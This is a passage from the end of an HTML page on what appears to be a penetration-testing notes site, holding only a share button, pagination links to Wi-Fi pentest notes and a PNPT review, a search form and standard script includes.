
  <a href="https://www.linkedin.com/shareArticle?mini=true&url=http%3A%2F%2Flocalhost%3A4000%2Fnotes%2Fecppt%2Fruby%2F" class="btn btn--linkedin" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on LinkedIn"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span> LinkedIn</span></a>
</section>


      
  <nav class="pagination">
    
      <a href="/notes/ecppt/wifi/" class="pagination--pager" title="6 - Wi-Fi Pentest
">Previous</a>
    
    
      <a href="/review/pnpt/" class="pagination--pager" title="Practical Network Penetration Tester
">Next</a>
    
  </nav>

    </div>

    
  </article>

  
  
</div>

    </div>

    
      <div class="search-content">
        <div class="search-content__inner-wrap"><form class="search-content__form" onkeydown="return event.key != 'Enter';">
    <label class="sr-only" for="search">
      Enter your search term...
    </label>
    <input type="search" id="search" class="search-input" tabindex="-1" placeholder="Enter your search term..." />
  </form>
  <div id="results" class="results"></div></div>

      </div>
    

    <div id="footer" class="page__footer">

    </div>

    
  <script src="/assets/js/main.min.js"></script>
  <script src="https://kit.fontawesome.com/4eee35f757.js"></script>




<script src="/assets/js/lunr/lunr.min.js"></script>
<script src="/assets/js/lunr/lunr-store.js"></script>
<script src="/assets/js/lunr/lunr-en.js"></script>





  
    <script src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js"></script>
  
    <script src="/assets/js/clipboard.js"></script>
  



  </body>
</html>
